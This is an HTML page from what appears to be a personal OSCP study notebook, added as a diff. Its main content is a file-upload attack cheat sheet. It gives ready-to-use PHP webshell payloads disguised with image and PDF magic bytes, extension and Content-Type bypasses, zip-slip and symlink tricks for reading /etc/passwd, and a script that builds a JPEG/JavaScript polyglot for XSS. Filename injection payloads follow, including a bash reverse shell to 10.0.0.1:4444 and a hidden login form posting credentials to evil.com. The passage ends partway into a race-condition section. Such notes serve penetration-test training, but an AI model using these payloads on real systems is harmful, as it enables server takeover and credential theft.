@@ -1,0 +1,678 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Additional File Upload - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">1.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">1.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">1.3.</strong> File Transfer</a></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">1.4.</strong> Ports</a></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">1.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">2.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.2.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">2.3.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">2.3.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">2.3.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">2.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">2.5.</strong> File Uploads</a></li><li class="chapter-item expanded "><a href="AddnlFileUpload.html" class="active"><strong aria-hidden="true">2.6.</strong> Additional File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">2.6.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">2.6.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">2.6.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">2.7.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">2.8.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">2.9.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">2.10.</strong> SQL</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="PSQL.html"><strong aria-hidden="true">2.10.1.</strong> PSQL</a></li></ol></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">2.11.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">2.12.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">2.13.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">3.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="KerberosCheetSheet.html"><strong aria-hidden="true">5.1.</strong> Kerberos Cheat Sheet</a></li><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">5.2.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">5.3.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">5.4.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">5.5.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">5.6.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">5.7.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">5.8.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="file-upload-attack"><a class="header" href="#file-upload-attack">File Upload Attack</a></h1>
+<p>Last modified: 2023-11-11</p>
+<p>Web</p>
+<hr />
+<p>It is often used for gaining access to the target shell using Reverse Shell, or getting sensitive information using Remote Code Execution (RCE).</p>
+<h2 id="check-allowed-file-formats"><a class="header" href="#check-allowed-file-formats"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#check-allowed-file-formats">Check Allowed File Formats</a></a></h2>
+<p>First off, we need to know what file types are allowed to be uploaded in target website.<br />
+Try to upload any formats.</p>
+<pre><code class="language-txt">.php, .php3, .php4, .php5, .phtml, .phar
+.jpg, jpeg, .png, .gif
+.bmp
+.pdf
+.js
+.exe, .dll, .asp, .aspx
+.py
+.go
+.rs
+</code></pre>
+<h3 id="create-blank-files-for-each-format"><a class="header" href="#create-blank-files-for-each-format"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#create-blank-files-for-each-format">Create Blank Files for Each Format</a></a></h3>
+<p>To create a blank file for the checking purpose, execute the following command.</p>
+<ul>
+<li><strong>jpg, png</strong></li>
+</ul>
+<pre><code class="language-bash"># https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images
+convert -size 32x32 xc:white test.jpg
+convert -size 32x32 xc:white test.png
+</code></pre>
+<ul>
+<li><strong>pdf</strong></li>
+</ul>
+<pre><code class="language-bash"># https://unix.stackexchange.com/questions/277892/how-do-i-create-a-blank-pdf-from-the-command-line
+convert xc:none -page Letter a.pdf
+</code></pre>
+<h2 id="bypass-file-extension-validation"><a class="header" href="#bypass-file-extension-validation"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#bypass-file-extension-validation">Bypass File Extension Validation</a></a></h2>
+<p>We might be able to bypass file extension validation by modifying the filename.<br />
+For example, if we cannot upload a pure <strong><code>.php</code></strong> file extension, tweak the filename a bit as below.</p>
+<pre><code class="language-txt">exploit.php
+exploit.php3
+exploit.php4
+exploit.php5
+exploit.phtml
+exploit.phar
+
+exploit.jpg.php
+exploit.jpeg.php
+exploit.png.php
+exploit.gif.php
+exploit.pdf.php
+
+exploit.php.
+exploit.php.jpg
+exploit.php.jpeg
+exploit.php.png
+exploit%2Ephp
+exploit.p.phphp
+exploit.php%00.jpg
+exploit.php%0d%0a.jpg
+
+exploit.PHP
+exploit.pHp
+
+exploit.php/
+exploit.php//
+exploit.php\
+exploit.php#
+exploit..php
+</code></pre>
+<h2 id="bypass-content-type-validation"><a class="header" href="#bypass-content-type-validation"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#bypass-content-type-validation">Bypass Content-Type Validation</a></a></h2>
+<p>We might be able to bypass the content type validation by modifying that.<br />
+For example, assume that we want to upload <strong><code>PHP</code></strong> file to execute <strong>webshell</strong> or <strong>reverse shell</strong>, but <code>PHP</code> files are rejected by the website.<br />
+In this situation, we might be able to bypass the validation by modifying the <strong>"Content-Type"</strong> from <strong>"application/x-php"</strong> to other types such as <strong>"image/jpeg"</strong>, <strong>"plain/text"</strong> etc.<br />
+Here is the example.</p>
+<pre><code class="language-html">------abcdefghijk
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg &lt;!-- Change this. Try other types such as image/gif, plain/text, etc. --&gt;
+
+&lt;?php echo system($_GET['cmd']); ?&gt;
+
+------abcdefghijk
+</code></pre>
+<h2 id="change-upload-location-by-filename"><a class="header" href="#change-upload-location-by-filename"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#change-upload-location-by-filename">Change Upload Location by Filename</a></a></h2>
+<p>We might be able to upload our file to <strong>unintended location</strong> by path traversing with filename e.g. <strong><code>../example.php</code></strong> or <strong><code>..%2Fexample.php</code></strong>.</p>
+<pre><code class="language-html">------abcdefghijk
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php" &lt;!-- Change this. --&gt;
+Content-Type: application/x-php
+
+&lt;?php echo system($_GET['cmd']); ?&gt;
+
+------abcdefghijk
+</code></pre>
+<h2 id="overwrite-server-configuration"><a class="header" href="#overwrite-server-configuration"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#overwrite-server-configuration">Overwrite Server Configuration</a></a></h2>
+<p>We might be able to overwrite the web server configuration file such as <strong>".htaccess"</strong>, <strong>".htpasswd"</strong> by specifying the filename to the name of the config file and write desired contents of that.</p>
+<pre><code class="language-html">------abcdefghijk
+Content-Disposition: form-data; name="avatar"; filename=".htaccess" &lt;!-- Specify the name of config file --&gt;
+Content-Type: text/plain
+
+AddType application/x-httpd-php .abc
+
+------abcdefghijk
+</code></pre>
+<h2 id="magic-bytes"><a class="header" href="#magic-bytes"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#magic-bytes">Magic Bytes</a></a></h2>
+<p>Reference: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia</a></p>
+<p>If the website checks the magic byte of the uploaded file for allowing only image files to be uploaded, we might be able to bypass this validation by adding magic bytes before the actual payload.</p>
+<p>The <strong><code>exif_imagetype()</code></strong> PHP function is likely to be used for such validation.<br />
+In addition, we may need to change other values such as <strong>"Content-Type"</strong> depending on the situation.</p>
+<h3 id="png"><a class="header" href="#png"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#png">PNG</a></a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
+<tr><td><code>89 50 4E 47 0D 0A 1A 0A</code></td><td><code>‰PNG␍␊␚␊</code></td></tr>
+</tbody></table>
+</div>
+<p>Payload example:</p>
+<pre><code class="language-php">‰PNG␍␊␚␊
+&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></pre>
+<h3 id="jpgjpeg"><a class="header" href="#jpgjpeg"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#jpg%2Fjpeg">JPG/JPEG</a></a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
+<tr><td><code>FF D8 FF EE</code></td><td><code>ÿØÿî</code></td></tr>
+<tr><td><code>FF D8 FF E0</code></td><td><code>ÿØÿà</code></td></tr>
+<tr><td><code>FF D8 FF E0 00 10 4A 46 49 46 00 01</code></td><td><code>ÿØÿà␀␐JFIF␀␁</code></td></tr>
+</tbody></table>
+</div>
+<p>Payload example:</p>
+<pre><code class="language-php">ÿØÿî
+&lt;?php echo system($_GET['cmd']); ?&gt;
+
+// or
+
+ÿØÿà
+&lt;?php echo system($_GET['cmd']); ?&gt;
+
+// or
+
+ÿØÿà␀␐JFIF␀␁
+&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></pre>
+<h3 id="pdf"><a class="header" href="#pdf"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#pdf">PDF</a></a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
+<tr><td><code>25 50 44 46 2D</code></td><td><code>%PDF-</code></td></tr>
+</tbody></table>
+</div>
+<p>Payload example:</p>
+<pre><code class="language-php">%PDF-
+&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></pre>
+<h3 id="gif"><a class="header" href="#gif"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#gif">GIF</a></a></h3>
+<p>Reference: <a href="https://docstore.mik.ua/orelly/web2/wdesign/ch19_01.htm">Web Design in a Nutshell</a></p>
+<ul>
+<li><strong>GIF87a</strong>: The original format for indexed color images. It uses LZW compression and has the option of being interlaced.</li>
+<li><strong>GIF89a</strong>: Is the same as <strong>GIF87a</strong> but also includes transparancy and animation capabilities.</li>
+</ul>
+<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
+<tr><td><code>47 49 46 38 37 61</code></td><td><code>GIF87a</code></td></tr>
+<tr><td><code>47 49 46 38 39 61</code></td><td><code>GIF89a</code></td></tr>
+</tbody></table>
+</div>
+<p>Payload example:</p>
+<pre><code class="language-php">GIF87a
+&lt;?php echo system($_GET['cmd']); ?&gt;
+
+// or
+
+GIF89a
+&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></pre>
+<h3 id="riff-wave"><a class="header" href="#riff-wave"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#riff-wave">RIFF WAVE</a></a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Hex Signature</th><th>ISO 8859-1</th></tr></thead><tbody>
+<tr><td><code>52 49 46 46 ?? ?? ?? ?? 57 41 56 45</code></td><td><code>RIFF????WAVE</code></td></tr>
+</tbody></table>
+</div>
+<p>Payload example:</p>
+<pre><code class="language-bash">RIFF????WAVE
+&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></pre>
+<h2 id="zip"><a class="header" href="#zip"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#zip">Zip</a></a></h2>
+<p>If target website restricts uploads to zip files only, the website (server) may unzip uploaded files internally and displays the result of decompressed file somewhere e.g. <code>/upload/example.txt</code>.</p>
+<h3 id="zip-slip"><a class="header" href="#zip-slip"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#zip-slip">Zip Slip</a></a></h3>
+<p>Create a file containing ‘../’ in the filename, and compress this file.</p>
+<pre><code class="language-bash">echo '&lt;?php echo system("id");?&gt;' &gt; '../test.php'
+zip test.zip '../test.php'
+</code></pre>
+<p>After uploading the zip file, target website (server) will decompress this file and may store the <code>test.php</code> file into unexpected directory.</p>
+<h3 id="lfi-with-symlinks"><a class="header" href="#lfi-with-symlinks"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#lfi-with-symlinks">LFI with Symlinks</a></a></h3>
+<p>In local machine, create a symbolic link for a sensitive file. Then compress the symlink with <code>zip</code>.</p>
+<pre><code class="language-bash">ln -s /etc/passwd passwd.txt
+zip --symlink test.zip passwd.txt
+</code></pre>
+<p>When we upload the zip file to target website, the website decompress the zip file and may display the file of the symbolic link (<code>/etc/passwd</code>, etc.). In short, we may be able to see the contents of the sensitive file.</p>
+<h2 id="jpeg-polyglot-xss"><a class="header" href="#jpeg-polyglot-xss"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#jpeg-polyglot-xss">JPEG Polyglot XSS</a></a></h2>
+<p>Reference: <a href="https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a">https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a</a></p>
+<p>We may be able to inject XSS by inserting arbitrary JavaScript code into a JPEG file.<br />
+We can generate automatically a polyglot JPEG with <a href="https://github.com/s-3ntinel/imgjs_polygloter">imgjs_polygloter</a>.</p>
+<p>Below is the manual exploitation flow.</p>
+<h3 id="1-prepare-jpeg-image"><a class="header" href="#1-prepare-jpeg-image"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#1.-prepare-jpeg-image">1. Prepare JPEG Image</a></a></h3>
+<p>Here we create a blank JPEG image using <code>convert</code> command.</p>
+<pre><code class="language-bash">convert -size 100x100 xc:white evil.jpg
+
+# Backup for reproduction
+cp evil.jpg evil_original.jpg
+</code></pre>
+<h3 id="2-create-xss-payload-in-hex"><a class="header" href="#2-create-xss-payload-in-hex"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#2.-create-xss-payload-in-hex">2. Create XSS Payload in Hex</a></a></h3>
+<p>We will insert the following JavaScript code.</p>
+<pre><code class="language-bash">*/=alert("test");/*
+</code></pre>
+<p>To insert it into JPEG file, we need to convert this to HEX as below:</p>
+<pre><code class="language-bash">2A 2F 3D 61 6C 65 72 74 28 22 74 65 73 74 22 29 3B 2F 2A
+</code></pre>
+<h3 id="3-start-hex-editor"><a class="header" href="#3-start-hex-editor"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#3.-start-hex-editor">3. Start Hex Editor</a></a></h3>
+<p>Start Hex editor to modify our <code>evil.jpg</code>. We use <code>ghex</code> here but you can use your favorite HEX editor.</p>
+<pre><code class="language-bash">ghex evil.jpg
+</code></pre>
+<p>The original hex representation of the <code>evil.jpg</code> is as such follow:</p>
+<pre><code class="language-bash">FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 ...
+
+# Details of the Hex
+# FF D8: Start of image
+# FF E0: Application default header
+# 00 10: The length of the JPEG header (`00 10` represents 16 bytes)
+</code></pre>
+<h3 id="4-insert-our-javascript-into-jpeg-file"><a class="header" href="#4-insert-our-javascript-into-jpeg-file"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#4.-insert-our-javascript-into-jpeg-file">4. Insert Our JavaScript into JPEG File</a></a></h3>
+<p>Now start inserting our payload.<br />
+First we replace <code>00 10</code> after <code>FF D8 FF E0</code> with our <code>2F 2A (/*)</code>.</p>
+<pre><code class="language-bash">FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 ...
+</code></pre>
+<p>By this, the length of the JPEG header is <strong>12074 bytes</strong> (<code>0x2F2A</code> in decimal).</p>
+<p>Since the size of our payload is <strong>19 bytes</strong> as below:</p>
+<pre><code class="language-bash">python3
+&gt;&gt;&gt; payload = b'*/=alert("test");/*'
+&gt;&gt;&gt; len(payload)
+19
+</code></pre>
+<p>We need to pad out the remaining <strong>12042 bytes</strong> (<strong>12074 - 16 - 19</strong>) with nulls.<br />
+Below is the Python code example to generate a polyglot JPEG file, which refers to <a href="https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py">https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py</a>.</p>
+<pre><code class="language-python">payload = b'*/=alert("test");/*'
+input_file = 'evil_original.jpg'
+output_file = 'evil.jpg'
+
+a = open(input_file, 'rb').read()
+
+# Get the length of the header
+header_size = int(a.hex()[8:12], 16)
+new_header_size = int(payload.hex()[2:4]+payload.hex()[:2], 16)
+
+# Calculate the size of nulls for padding
+null_size = new_header_size - header_size - 16
+
+# Get start and end
+start = a[:40]
+end = a.hex()[40:]
+end = bytearray([int(end[i:i+2], 16) for i in range(0, len(end), 2)])
+
+res = start + (null_size * b'\x00') + payload + end
+
+with open(output_file, 'wb') as f:
+	f.write(res)
+</code></pre>
+<h3 id="5-xss-with-this-jpeg"><a class="header" href="#5-xss-with-this-jpeg"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#5.-xss-with-this-jpeg">5. XSS with this JPEG</a></a></h3>
+<p>Inject XSS to make our JPEG to execute JavaScript code. We need to set <code>charset</code> to <code>ISO-8859-1</code> for executing that.</p>
+<pre><code class="language-bash">&lt;script charset="ISO-8859-1" src="evil.jpg"&gt;
+</code></pre>
+<h2 id="malicious-filnames"><a class="header" href="#malicious-filnames"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#malicious-filnames">Malicious Filnames</a></a></h2>
+<h3 id="command-injection"><a class="header" href="#command-injection"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#command-injection">Command Injection</a></a></h3>
+<pre><code class="language-bash"># If the response comes after 10 seconds, the command injection is successful.
+test.jpg;sleep 10
+test.jpg;sleep+10
+test.jpg;sleep 10#
+test.jpg;sleep 10%00
+test.jpg|sleep 10
+test.jpg%0Asleep 10
+;sleep 10 test.jpg
+
+# Reverse Shell
+test.jpg;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1
+</code></pre>
+<h3 id="php-injection"><a class="header" href="#php-injection"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#php-injection">PHP Injection</a></a></h3>
+<pre><code class="language-html">&lt;?php echo system('id');?&gt;.jpg
+"&gt;&lt;?php echo system('id');?&gt;.jpg
+</code></pre>
+<h3 id="xss"><a class="header" href="#xss"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#xss">XSS</a></a></h3>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;.jpg
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;.jpg
+</code></pre>
+<h3 id="ssti"><a class="header" href="#ssti"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#ssti">SSTI</a></a></h3>
+<pre><code class="language-html">{{2*3}}.jpg
+{2*3}.jpg
+2*3.jpg
+2*3}}.jpg
+2*3}.jpg
+${2*3}.jpg
+"{{2*3}}.jpg
+</code></pre>
+<h3 id="truncation"><a class="header" href="#truncation"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#truncation">Truncation</a></a></h3>
+<pre><code class="language-bash">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxtest.jpg
+test.jpgxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+</code></pre>
+<h3 id="html-injection"><a class="header" href="#html-injection"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#html-injection">HTML Injection</a></a></h3>
+<p>Try to upload the file which includes <strong>HTML tags</strong> in the filename. It may affect the web page.</p>
+<pre><code class="language-html">&lt;h1&gt;test.jpg
+
+&lt;!-- `&amp;sol;`: HTML entiry for '/' --&gt;
+"&gt;&lt;iframe src="http:&amp;sol;&amp;sol;10.0.0.1"&gt;.jpg
+
+"&gt;&lt;img src=x onerror=alert(document.domain).jpg
+
+"&gt;&lt;form action="//evil.com" method="GET"&gt;&lt;input type="text" name="username" style="opacity:0;"&gt;&lt;input type="password" name="password" style="opacity:0;"&gt;&lt;input type="submit" name="submit" value="submit"&gt;&lt;!--.jpg
+</code></pre>
+<h3 id="sql-injection"><a class="header" href="#sql-injection"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#sql-injection">SQL Injection</a></a></h3>
+<p>Try to upload the file which includes <strong>SQL command</strong> in the filename. It may execute <strong>SQL Injection</strong> when uploading or other situations.</p>
+<pre><code class="language-txt">--sleep(10).jpg
+</code></pre>
+<h2 id="race-condition-attack"><a class="header" href="#race-condition-attack"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#race-condition-attack">Race Condition Attack</a></a></h2>
+<p>We might be able to bypass/execute payload using race condition.<br />
